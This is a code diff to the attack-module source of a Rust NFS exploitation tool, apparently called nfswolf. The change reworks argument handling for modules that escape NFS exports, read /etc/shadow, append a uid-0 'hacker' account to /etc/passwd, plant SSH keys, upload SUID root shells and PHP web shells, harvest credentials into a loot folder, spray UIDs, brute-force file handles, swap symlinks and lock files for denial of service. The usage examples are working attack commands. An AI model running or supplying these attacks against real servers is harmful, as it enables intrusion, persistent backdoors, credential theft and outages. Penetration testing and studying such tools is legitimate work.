@@ -1,9 +1,9 @@
 //! Automated exploitation modules.
 //!
-//! Attack modules are generic, composable operations. The `--escape` flag
-//! can be added to any file-targeting module to first escape the export
-//! to the filesystem root. Users choose what to read/write/upload  --  the
-//! tool doesn't hardcode target paths.
+//! Attack modules are generic, composable operations. To work outside the
+//! exported subtree, run `attack escape` first to obtain a root file handle
+//! and pass that hex string back in via `--handle HEX`. Users choose what
+//! to read/write/upload  --  the tool doesn't hardcode target paths.
 
 use std::fmt::Write as _;
 use std::io::Write as _;
@@ -14,7 +14,7 @@ use anyhow::Context as _;
 use clap::{Parser, Subcommand};
 use colored::Colorize as _;
 
-use crate::cli::GlobalOpts;
+use crate::cli::{GlobalOpts, H_BEHAVIOR, H_IDENTITY, H_OUTPUT, H_PERMISSIONS, H_TARGET};
 use crate::engine::credential::CredentialManager;
 use crate::engine::file_handle::FileHandleAnalyzer;
 use crate::engine::fs_walker::{FsWalker, SecretPatterns, WalkConfig};
@@ -33,7 +33,7 @@ use nfs3_types::nfs3::Nfs3Result;
 ///
 /// Modules:
 ///   escape        Escape export to filesystem root (subtree_check bypass)
-///   read          Read any file (combine with --escape for out-of-export files)
+///   read          Read any file (use --handle from `attack escape` for out-of-export files)
 ///   write         Write / overwrite a file  [requires --allow-write]
 ///   upload        Upload a local file with controlled permissions  [--allow-write]
 ///   harvest       Recursively collect credentials and secrets
@@ -43,14 +43,14 @@ use nfs3_types::nfs3::Nfs3Result;
 ///   lock-dos      Hold NLM locks to prevent legitimate access
 ///
 /// Typical workflow:
-///   nfswolf attack escape HOST --export /srv
-///   nfswolf attack read   HOST --export /srv --escape --path /etc/shadow
+///   nfswolf attack escape HOST --export /srv         # prints HEX root handle
+///   nfswolf attack read   HOST --handle HEX --path /etc/shadow
 ///   nfswolf shell         HOST --handle HEX
 #[derive(Parser)]
 pub struct AttackArgs {
     /// Required for write, upload, symlink-swap, and mknod operations.
     /// Protects against accidental writes during audits.
-    #[arg(long, global = true)]
+    #[arg(long, global = true, help_heading = H_PERMISSIONS)]
     pub allow_write: bool,
 
     #[command(subcommand)]
@@ -58,41 +58,51 @@ pub struct AttackArgs {
 }
 
 /// Common options for modules that operate on files within an export.
-/// Combine with --escape or --handle to target files outside the export boundary.
+/// To target files outside the export boundary, run `attack escape` first
+/// to obtain a root handle, then pass that hex string back via `--handle`.
+///
+/// The `host` field is the raw `<TARGET>` positional and may contain
+/// either a bare host or a `host:/export` colon-form.  Code that needs
+/// the resolved IP and export should call [`FileTargetOpts::resolve`]
+/// rather than reading `host`/`export` directly.
 #[derive(Parser, Clone)]
 pub struct FileTargetOpts {
-    /// Target NFS server (IP or hostname)
+    /// Target host with optional :/export suffix (e.g. 10.0.0.5:/srv)
+    #[arg(help_heading = H_TARGET, value_name = "TARGET")]
     pub host: String,
 
-    /// Export path to mount on the server.
+    /// Export path (alternative to host:/export in the positional target).
     /// Not required when --handle is given -- the handle bypasses MOUNT entirely.
-    #[arg(long = "export", short = 'e', value_name = "PATH", required_unless_present = "handle")]
+    #[arg(long = "export", short = 'e', value_name = "PATH", help_heading = H_TARGET)]
     pub export: Option<String>,
-
-    /// Escape the export to the filesystem root before operating.
-    /// Constructs a root handle via subtree_check bypass (ext4, xfs, btrfs).
-    /// Use when the file you want is outside the exported directory.
-    #[arg(long)]
-    pub escape: bool,
 
     /// Use a raw root file handle (hex) instead of mounting an export.
     /// Obtain handles from `attack escape` or `attack brute-handle`.
-    /// Conflicts with --escape (escape constructs a new handle at runtime).
-    #[arg(long, value_name = "HEX", conflicts_with = "escape")]
+    #[arg(long, value_name = "HEX", help_heading = H_TARGET)]
     pub handle: Option<String>,
 
     /// UID for this operation (overrides global -u / --uid)
-    #[arg(long, value_name = "UID")]
+    #[arg(long, value_name = "UID", help_heading = H_IDENTITY)]
     pub uid: Option<u32>,
 
     /// GID for this operation (overrides global -g / --gid)
-    #[arg(long, value_name = "GID")]
+    #[arg(long, value_name = "GID", help_heading = H_IDENTITY)]
     pub gid: Option<u32>,
 
     /// Additional GIDs to include in the AUTH_SYS credential (comma-separated).
     /// Use to claim supplementary group membership (e.g. --aux-gids 42 for shadow on Debian).
-    #[arg(long, value_delimiter = ',', value_name = "GID,...")]
+    #[arg(long, value_delimiter = ',', value_name = "GID,...", help_heading = H_IDENTITY)]
     pub aux_gids: Vec<u32>,
+}
+
+impl FileTargetOpts {
+    /// Run the unified target parser over `host` + `--export` + `--handle`.
+    ///
+    /// Each module needs a source (export or handle); when neither is
+    /// provided the parser raises a clear error.
+    fn resolve(&self) -> anyhow::Result<crate::cli::target::Target> {
+        crate::cli::target::parse(&self.host, self.export.as_deref(), self.handle.as_deref(), true)
+    }
 }
 
 #[derive(Subcommand)]
@@ -117,31 +127,33 @@ pub enum AttackModule {
     ///   nfswolf attack escape 192.168.1.10 --export /srv
     ///   nfswolf attack escape 192.168.1.10 --export /srv --btrfs-subvols 32
     Escape {
-        /// Target host (IP or hostname)
+        /// Target host with optional :/export suffix (e.g. 10.0.0.5:/srv)
+        #[arg(help_heading = H_TARGET, value_name = "TARGET")]
         host: String,
-        /// Export path to mount and escape from
-        #[arg(long = "export", short = 'e', value_name = "PATH")]
-        export: String,
+        /// Export path (alternative to host:/export in the positional target)
+        #[arg(long = "export", short = 'e', value_name = "PATH", help_heading = H_TARGET)]
+        export: Option<String>,
         /// Mount the escaped filesystem at a local directory (requires FUSE feature)
-        #[arg(long, value_name = "DIR")]
+        #[arg(long, value_name = "DIR", help_heading = H_BEHAVIOR)]
         mount_at: Option<String>,
         /// Number of BTRFS subvolume IDs to try (starting at 256)
-        #[arg(long, default_value = "16", value_name = "N")]
+        #[arg(long, default_value = "16", value_name = "N", help_heading = H_BEHAVIOR)]
         btrfs_subvols: u32,
         /// Inode scan depth for the fallback brute-force pass (default: 200).
         /// The root inode is always within the first 200 inodes on any Linux
         /// filesystem, so the default covers all practical cases.
-        #[arg(long, default_value = "200", value_name = "N")]
+        #[arg(long, default_value = "200", value_name = "N", help_heading = H_BEHAVIOR)]
         max_root_scan: u32,
     },
 
     /// Read a file from the target.
     ///
-    /// Generic file read  --  combine with --escape to read files outside
-    /// the export boundary. Use --gid 42 for Debian shadow group access.
+    /// Generic file read. To reach files outside the export boundary, run
+    /// `attack escape` first to get a root handle, then pass it via --handle.
+    /// Use --gid 42 for Debian shadow group access.
     ///
     /// Examples:
-    ///   attack read target --export /srv --escape --path /etc/shadow --gid 42
+    ///   attack read target --handle HEX --path /etc/shadow --gid 42
     ///   attack read target --export /home --path /home/alice/.bashrc --uid 1000
     Read {
         #[command(flatten)]
@@ -149,44 +161,45 @@ pub enum AttackModule {
 
         /// Remote path to read (absolute from export root, or filesystem
         /// root if --escape is used)
-        #[arg(long)]
+        #[arg(long, help_heading = H_BEHAVIOR)]
         path: String,
 
         /// Write output to local file instead of stdout
-        #[arg(short, long)]
+        #[arg(short, long, help_heading = H_OUTPUT)]
         output: Option<String>,
     },
 
     /// Write content to a file on the target.
     ///
-    /// Generic file write  --  combine with --escape to write anywhere.
+    /// Generic file write. To write outside the export boundary, run
+    /// `attack escape` first to get a root handle, then pass it via --handle.
     /// Use --append to add to existing files (e.g., authorized_keys).
     ///
     /// Examples:
-    ///   attack write target --export /srv --escape --path /etc/passwd --append --data 'hacker:x:0:0::/root:/bin/bash'
+    ///   attack write target --handle HEX --path /etc/passwd --append --data 'hacker:x:0:0::/root:/bin/bash'
     ///   attack write target --export /home --path /home/bob/.ssh/authorized_keys --uid 1000 --append --data 'ssh-rsa AAAA...'
     Write {
         #[command(flatten)]
         target: FileTargetOpts,
 
         /// Remote path to write
-        #[arg(long)]
+        #[arg(long, help_heading = H_BEHAVIOR)]
         path: String,
 
         /// Content to write (string). Mutually exclusive with --file.
-        #[arg(long, group = "content")]
+        #[arg(long, group = "content", help_heading = H_BEHAVIOR)]
         data: Option<String>,
 
         /// Local file whose contents to write. Mutually exclusive with --data.
-        #[arg(long, group = "content")]
+        #[arg(long, group = "content", help_heading = H_BEHAVIOR)]
         file: Option<String>,
 
         /// Append to existing file instead of overwriting
-        #[arg(long)]
+        #[arg(long, help_heading = H_BEHAVIOR)]
         append: bool,
 
         /// Set file mode after writing (octal, e.g., 0644)
-        #[arg(long)]
+        #[arg(long, help_heading = H_PERMISSIONS)]
         mode: Option<String>,
     },
 
@@ -196,91 +209,91 @@ pub enum AttackModule {
     /// Use --suid to set the setuid bit (requires no_root_squash + uid 0).
     ///
     /// Examples:
-    ///   attack upload target --export /srv --escape --file ./rootshell --path /tmp/.shell --suid --uid 0
-    ///   attack upload target --export /srv --escape --file ./shell.php --path /var/www/html/cmd.php
+    ///   attack upload target --handle HEX --file ./rootshell --path /tmp/.shell --suid --uid 0
+    ///   attack upload target --export /var/www --file ./shell.php --path /var/www/html/cmd.php
     Upload {
         #[command(flatten)]
         target: FileTargetOpts,
 
         /// Local file to upload
-        #[arg(long)]
+        #[arg(long, help_heading = H_BEHAVIOR)]
         file: String,
 
         /// Remote path to place the file
-        #[arg(long)]
+        #[arg(long, help_heading = H_BEHAVIOR)]
         path: String,
 
         /// Set the SUID bit on the uploaded file (requires no_root_squash + uid 0)
-        #[arg(long)]
+        #[arg(long, help_heading = H_PERMISSIONS)]
         suid: bool,
 
         /// Set the SGID bit on the uploaded file
-        #[arg(long)]
+        #[arg(long, help_heading = H_PERMISSIONS)]
         sgid: bool,
 
         /// File mode (octal, e.g., 0755). Defaults to 0755 if --suid, else 0644.
-        #[arg(long)]
+        #[arg(long, help_heading = H_PERMISSIONS)]
         mode: Option<String>,
     },
 
     /// Recursively harvest credentials and secrets from the target.
     ///
     /// Walks the filesystem looking for SSH keys, .env files, configs,
-    /// database dumps, and other sensitive files. Combine with --escape
-    /// to search the entire filesystem.
+    /// database dumps, and other sensitive files. To search outside the
+    /// exported subtree, run `attack escape` first to obtain a root handle.
     ///
     /// Examples:
     ///   attack harvest target --export /home
-    ///   attack harvest target --export /srv --escape
-    ///   attack harvest target --export /srv --handle 0x01000200...
+    ///   attack harvest target --handle 01000200...
     Harvest {
         #[command(flatten)]
         target: FileTargetOpts,
 
         /// Output directory for found secrets
-        #[arg(short, long, default_value = "./loot")]
+        #[arg(short, long, default_value = "./loot", help_heading = H_OUTPUT)]
         output: String,
 
         /// Maximum depth to recurse
-        #[arg(long, default_value = "10")]
+        #[arg(long, default_value = "10", help_heading = H_BEHAVIOR)]
         depth: u32,
 
         /// Additional filename patterns to match (glob syntax, comma-separated)
-        #[arg(long, value_delimiter = ',')]
+        #[arg(long, value_delimiter = ',', help_heading = H_BEHAVIOR)]
         patterns: Vec<String>,
 
         /// Compute SHA-256 hashes of downloaded files
-        #[arg(long)]
+        #[arg(long, help_heading = H_BEHAVIOR)]
         hash: bool,
     },
 
     /// Spray UIDs/GIDs to discover which identities can access files.
     UidSpray {
-        /// Target host
+        /// Target host with optional :/export suffix (e.g. 10.0.0.5:/srv)
+        #[arg(help_heading = H_TARGET, value_name = "TARGET")]
         host: String,
-        /// Export path
-        #[arg(long)]
-        export: String,
+        /// Export path (alternative to host:/export in the positional target)
+        #[arg(short = 'e', long, help_heading = H_TARGET)]
+        export: Option<String>,
         /// UID range start
-        #[arg(long, default_value = "0")]
+        #[arg(long, default_value = "0", help_heading = H_IDENTITY)]
         uid_start: u32,
         /// UID range end
-        #[arg(long, default_value = "65535")]
+        #[arg(long, default_value = "65535", help_heading = H_IDENTITY)]
         uid_end: u32,
         /// GID range start
-        #[arg(long, default_value = "0")]
+        #[arg(long, default_value = "0", help_heading = H_IDENTITY)]
         gid_start: u32,
         /// GID range end
-        #[arg(long, default_value = "65535")]
+        #[arg(long, default_value = "65535", help_heading = H_IDENTITY)]
         gid_end: u32,
         /// Path to check access against
-        #[arg(long, default_value = "/")]
+        #[arg(long, default_value = "/", help_heading = H_BEHAVIOR)]
         path: String,
         /// Auxiliary GIDs to include in each attempt (comma-separated)
-        #[arg(long, value_delimiter = ',')]
+        #[arg(long, value_delimiter = ',', help_heading = H_IDENTITY)]
         aux_gids: Vec<u32>,
         /// Delay between attempts in ms (independent of global --delay)
-        #[arg(long, default_value = "0")]
+        #[arg(long, default_value = "0", help_heading = crate::cli::H_STEALTH)]
         attempt_delay: u64,
     },
 
@@ -297,29 +310,30 @@ pub enum AttackModule {
     ///   nfswolf attack brute-handle 192.168.1.10 --export /srv --seed-handle 01000200...
     ///   nfswolf attack brute-handle 192.168.1.10 --export /srv --seed-handle 01000200... --fs-type xfs --max-attempts 50000
     BruteHandle {
-        /// Target host (IP or hostname)
+        /// Target host (IP or hostname; export portion ignored if present)
+        #[arg(help_heading = H_TARGET, value_name = "TARGET")]
         host: String,
         /// Filesystem type to guide candidate generation (ext4, xfs, btrfs)
-        #[arg(long, default_value = "ext4", value_name = "TYPE")]
+        #[arg(long, default_value = "ext4", value_name = "TYPE", help_heading = H_BEHAVIOR)]
         fs_type: String,
         /// Known handle (hex, required) from a prior mount or escape.
         /// Used to derive the filesystem ID and handle format.
         /// Obtain via `shell ... -c handle` or from the escape output.
-        #[arg(long, required = true, value_name = "HEX")]
+        #[arg(long, required = true, value_name = "HEX", help_heading = H_TARGET)]
         seed_handle: String,
         /// Maximum number of handles to probe
-        #[arg(long, default_value = "10000", value_name = "N")]
+        #[arg(long, default_value = "10000", value_name = "N", help_heading = H_BEHAVIOR)]
         max_attempts: u64,
         /// Fix inode to this value and sweep generations instead of sweeping inodes.
         /// Use when STALE oracle confirms the inode exists but generation is unknown.
         /// Example: --fixed-inode 2 to brute-force the generation of the ext4 root.
-        #[arg(long, value_name = "INODE")]
+        #[arg(long, value_name = "INODE", help_heading = H_BEHAVIOR)]
         fixed_inode: Option<u32>,
         /// Generation range start (used with --fixed-inode)
-        #[arg(long, default_value = "0", value_name = "GEN")]
+        #[arg(long, default_value = "0", value_name = "GEN", help_heading = H_BEHAVIOR)]
         gen_start: u32,
         /// Generation range end (used with --fixed-inode; 0 = use max_attempts from gen_start)
-        #[arg(long, default_value = "0", value_name = "GEN")]
+        #[arg(long, default_value = "0", value_name = "GEN", help_heading = H_BEHAVIOR)]
         gen_end: u32,
     },
 
@@ -329,38 +343,40 @@ pub enum AttackModule {
     /// the child can be replaced with a symlink pointing anywhere on the
     /// server's filesystem. Requires write access to the parent.
     SymlinkSwap {
-        /// Target host
+        /// Parent export target as host[:/parent_export] (e.g. 10.0.0.5:/srv)
+        #[arg(help_heading = H_TARGET, value_name = "TARGET")]
         host: String,
-        /// Parent export path (must be writable)
-        #[arg(long)]
-        parent_export: String,
+        /// Parent export path (alternative to host:/parent_export). Must be writable.
+        #[arg(short = 'e', long = "export", alias = "parent-export", help_heading = H_TARGET)]
+        parent_export: Option<String>,
         /// Child directory name to replace with symlink
-        #[arg(long)]
+        #[arg(long, help_heading = H_BEHAVIOR)]
         child_name: String,
         /// Symlink target path on the server (e.g., /etc, /root, /)
-        #[arg(long)]
+        #[arg(long, help_heading = H_BEHAVIOR)]
         link_target: String,
     },
 
     /// Acquire NLM locks on target files (denial of service).
     LockDos {
-        /// Target host.
+        /// Target host with optional :/export suffix (e.g. 10.0.0.5:/srv)
+        #[arg(help_heading = H_TARGET, value_name = "TARGET")]
         host: String,
-        /// Export path.
-        #[arg(long)]
-        export: String,
+        /// Export path (alternative to host:/export in the positional target)
+        #[arg(short = 'e', long, help_heading = H_TARGET)]
+        export: Option<String>,
         /// Files to lock (relative to export, comma-separated).
-        #[arg(long, value_delimiter = ',')]
+        #[arg(long, value_delimiter = ',', help_heading = H_BEHAVIOR)]
         files: Vec<String>,
         /// Maximum number of concurrent locks to acquire (measures server lock table capacity).
         /// Locks are acquired on successive 1-byte ranges [0..1], [1..2], etc.
-        #[arg(long, default_value = "1")]
+        #[arg(long, default_value = "1", help_heading = H_BEHAVIOR)]
         count: u32,
         /// Hold locks indefinitely (otherwise release after --hold-secs).
-        #[arg(long)]
+        #[arg(long, help_heading = H_BEHAVIOR)]
         hold_forever: bool,
         /// Seconds to hold locks before releasing.
-        #[arg(long, default_value = "300")]
+        #[arg(long, default_value = "300", help_heading = H_BEHAVIOR)]
         hold_secs: u64,
     },
 }
@@ -377,23 +393,45 @@ pub async fn run(args: AttackArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
 
     let stealth = StealthConfig::new(globals.delay, globals.jitter);
 
-    match args.module {
-        AttackModule::Escape { host, export, btrfs_subvols, max_root_scan, .. } => run_escape(&host, &export, btrfs_subvols, max_root_scan).await,
+    let result = match args.module {
+        AttackModule::Escape { host, export, btrfs_subvols, max_root_scan, .. } => {
+            let t = crate::cli::target::parse(&host, export.as_deref(), None, true)?;
+            run_escape(&t.host.to_string(), t.export().unwrap_or("/"), btrfs_subvols, max_root_scan).await
+        },
         AttackModule::Read { target, path, output } => run_read(&target, &path, output.as_deref(), globals, &stealth).await,
         AttackModule::Write { target, path, data, file, append, .. } => run_write(&target, &path, data.as_deref(), file.as_deref(), append, globals, &stealth).await,
         AttackModule::Upload { target, file, path, suid, .. } => run_upload(&target, &file, &path, suid, globals, &stealth).await,
         AttackModule::Harvest { target, output, depth, patterns, hash } => run_harvest(&target, &output, depth, &patterns, hash, globals, &stealth).await,
-        AttackModule::UidSpray { host, export, uid_start, uid_end, gid_start, gid_end, path, aux_gids, attempt_delay } => run_uid_spray(&host, &export, uid_start..=uid_end, gid_start..=gid_end, &path, &aux_gids, attempt_delay, &stealth).await,
+        AttackModule::UidSpray { host, export, uid_start, uid_end, gid_start, gid_end, path, aux_gids, attempt_delay } => {
+            let t = crate::cli::target::parse(&host, export.as_deref(), None, true)?;
+            run_uid_spray(&t.host.to_string(), t.export().unwrap_or("/"), uid_start..=uid_end, gid_start..=gid_end, &path, &aux_gids, attempt_delay, &stealth).await
+        },
         AttackModule::BruteHandle { host, fs_type, seed_handle, max_attempts, fixed_inode, gen_start, gen_end } => run_brute_handle(&host, &fs_type, &seed_handle, max_attempts, fixed_inode, gen_start, gen_end, &stealth).await,
-        AttackModule::SymlinkSwap { host, parent_export, child_name, link_target } => run_symlink_swap(&host, &parent_export, &child_name, &link_target, &stealth).await,
-        AttackModule::LockDos { host, export, files, count, hold_forever, hold_secs } => run_lock_dos(&host, &export, &files, count, hold_forever, hold_secs).await,
+        AttackModule::SymlinkSwap { host, parent_export, child_name, link_target } => {
+            let t = crate::cli::target::parse(&host, parent_export.as_deref(), None, true)?;
+            run_symlink_swap(&t.host.to_string(), t.export().unwrap_or("/"), &child_name, &link_target, &stealth).await
+        },
+        AttackModule::LockDos { host, export, files, count, hold_forever, hold_secs } => {
+            let t = crate::cli::target::parse(&host, export.as_deref(), None, true)?;
+            run_lock_dos(&t.host.to_string(), t.export().unwrap_or("/"), &files, count, hold_forever, hold_secs).await
+        },
+    };
+    if result.is_ok() {
+        crate::cli::emit_replay(globals);
     }
+    result
 }
 
 // --- Connection helpers ---
 
 /// Parse a host string into a `SocketAddr` using NFS port 2049.
+///
+/// Accepts the same `<TARGET>` shapes as the rest of the CLI:
+/// `host`, `host:port`, `host:/export` (export portion ignored here).
 fn parse_addr(host: &str) -> anyhow::Result<SocketAddr> {
+    // Strip an optional `:/export` suffix so the colon-form target works
+    // wherever a bare host did before.
+    let host = host.find(":/").map_or(host, |idx| &host[..idx]);
     // Try direct parse first (handles host:port format).
     if let Ok(addr) = host.parse::<SocketAddr>() {
         return Ok(addr);
@@ -444,51 +482,50 @@ fn build_gid_list(gid: u32, aux_gids: &[u32]) -> Vec<u32> {
 
 /// Build the right client for a set of `FileTargetOpts`.
 ///
-/// When `--handle` is given, the connection bypasses MOUNT (bearer token,
-/// RFC 1094 S2.3.3). Otherwise it mounts the export normally.
-fn make_client_for_opts(addr: SocketAddr, opts: &FileTargetOpts, uid: u32, gid: u32, stealth: StealthConfig) -> (Arc<ConnectionPool>, Arc<CircuitBreaker>, Nfs3Client) {
-    if opts.handle.is_some() {
-        make_client_direct(addr, uid, gid, &opts.aux_gids, stealth)
-    } else {
-        let export = opts.export.as_deref().unwrap_or("/");
-        make_client(addr, export, uid, gid, &opts.aux_gids, stealth)
+/// When the resolved source is `Handle`, the connection bypasses MOUNT
+/// (bearer token, RFC 1094 S2.3.3). Otherwise it mounts the export.
+fn make_client_for_opts(addr: SocketAddr, opts: &FileTargetOpts, uid: u32, gid: u32, stealth: StealthConfig) -> anyhow::Result<(Arc<ConnectionPool>, Arc<CircuitBreaker>, Nfs3Client)> {
+    let target = opts.resolve()?;
+    Ok(match target.source {
+        crate::cli::target::Source::Handle(_) => make_client_direct(addr, uid, gid, &opts.aux_gids, stealth),
+        crate::cli::target::Source::Export(export) => make_client(addr, &export, uid, gid, &opts.aux_gids, stealth),
+        crate::cli::target::Source::None => unreachable!("resolve(true) requires a source"),
+    })
+}
+
+/// Format the target string for status lines: "host:export" or "host (handle)".
+fn target_label(opts: &FileTargetOpts) -> String {
+    match opts.resolve() {
+        Ok(t) => match t.source {
+            crate::cli::target::Source::Export(p) => format!("{}:{p}", t.host),
+            crate::cli::target::Source::Handle(_) => format!("{} (handle)", t.host),
+            crate::cli::target::Source::None => t.host.to_string(),
+        },
+        Err(_) => opts.host.clone(),
     }
 }
 
-/// Format the target string for status lines: "host:export" or "host (handle)" .
-fn target_label(opts: &FileTargetOpts) -> String {
-    opts.export.as_ref().map_or_else(|| format!("{} (handle)", opts.host), |exp| format!("{}:{exp}", opts.host))
-}
-
-/// Resolve the working file handle: either use a provided hex handle, mount the
-/// export, or escape the export to the filesystem root.
+/// Resolve the working file handle: either use a provided hex handle or
+/// mount the export to obtain its root handle.
 ///
-/// When `--handle` is given, returns the parsed handle directly (no MOUNT needed).
-/// When `--escape` is given, mounts the export and constructs the root handle.
-/// Otherwise mounts the export and returns its root handle.
+/// When `--handle` is given, returns the parsed handle directly (no MOUNT
+/// needed). To reach files outside the export, run `attack escape` first
+/// and pass the resulting hex string back via `--handle`.
 async fn resolve_fh(opts: &FileTargetOpts) -> anyhow::Result<FileHandle> {
+    let target = opts.resolve()?;
+    let addr = SocketAddr::new(target.host, 111);
+
     // Raw handle bypasses MOUNT entirely (RFC 1094 S2.3.3 -- bearer token).
-    if let Some(hex) = &opts.handle {
+    if let crate::cli::target::Source::Handle(hex) = &target.source {
         return FileHandle::from_hex(hex).context("invalid hex file handle");
     }
 
-    // Export is guaranteed Some when handle is None (enforced by clap required_unless_present).
-    let export = opts.export.as_deref().unwrap_or("/");
-    let addr = parse_addr(&opts.host)?;
+    let export = match &target.source {
+        crate::cli::target::Source::Export(p) => p.as_str(),
+        _ => unreachable!("Handle case handled above; None rejected by parser"),
+    };
     let mount = NfsMountClient::new();
     let mnt = mount.mount(addr, export).await?;
-
-    if opts.escape {
-        let escape = FileHandleAnalyzer::construct_escape_handle(&mnt.handle).ok_or_else(|| anyhow::anyhow!("export escape not supported for this filesystem type"))?;
-        tracing::info!(
-            fs_type = ?escape.fs_type,
-            confidence = escape.confidence,
-            handle = escape.root_handle.to_hex(),
-            "escape handle constructed"
-        );
-        return Ok(escape.root_handle);
-    }
-
     Ok(mnt.handle)
 }
 
@@ -823,7 +860,7 @@ async fn run_read(opts: &FileTargetOpts, path: &str, output: Option<&str>, globa
     let uid = opts.uid.unwrap_or(globals.uid);
     let gid = opts.gid.unwrap_or(globals.gid);
     let addr = parse_addr(&opts.host)?;
-    let (_, _, client) = make_client_for_opts(addr, opts, uid, gid, stealth.clone());
+    let (_, _, client) = make_client_for_opts(addr, opts, uid, gid, stealth.clone())?;
 
     let root_fh = resolve_fh(opts).await?;
     let file_fh = lookup_path(&client, &root_fh, path).await?;
@@ -942,7 +979,7 @@ async fn run_write(opts: &FileTargetOpts, path: &str, data: Option<&str>, file: 
     let uid = opts.uid.unwrap_or(globals.uid);
     let gid = opts.gid.unwrap_or(globals.gid);
     let addr = parse_addr(&opts.host)?;
-    let (_, _, client) = make_client_for_opts(addr, opts, uid, gid, stealth.clone());
+    let (_, _, client) = make_client_for_opts(addr, opts, uid, gid, stealth.clone())?;
     let root_fh = resolve_fh(opts).await?;
     let file_fh = lookup_or_create(&client, &root_fh, path).await?;
 
@@ -997,7 +1034,7 @@ async fn run_upload(opts: &FileTargetOpts, local_file: &str, path: &str, suid: b
     let uid = opts.uid.unwrap_or(globals.uid);
     let gid = opts.gid.unwrap_or(globals.gid);
     let addr = parse_addr(&opts.host)?;
-    let (_, _, client) = make_client_for_opts(addr, opts, uid, gid, stealth.clone());
+    let (_, _, client) = make_client_for_opts(addr, opts, uid, gid, stealth.clone())?;
     let root_fh = resolve_fh(opts).await?;
     let file_fh = lookup_or_create(&client, &root_fh, path).await?;
 
@@ -1011,7 +1048,7 @@ async fn run_harvest(opts: &FileTargetOpts, output: &str, depth: u32, extra_patt
     let uid = opts.uid.unwrap_or(globals.uid);
     let gid = opts.gid.unwrap_or(globals.gid);
     let addr = parse_addr(&opts.host)?;
-    let (_, _, client) = make_client_for_opts(addr, opts, uid, gid, stealth.clone());
+    let (_, _, client) = make_client_for_opts(addr, opts, uid, gid, stealth.clone())?;
     let root_fh = resolve_fh(opts).await?;
 
     let credential_mgr = CredentialManager::new(uid, gid, &globals.hostname);
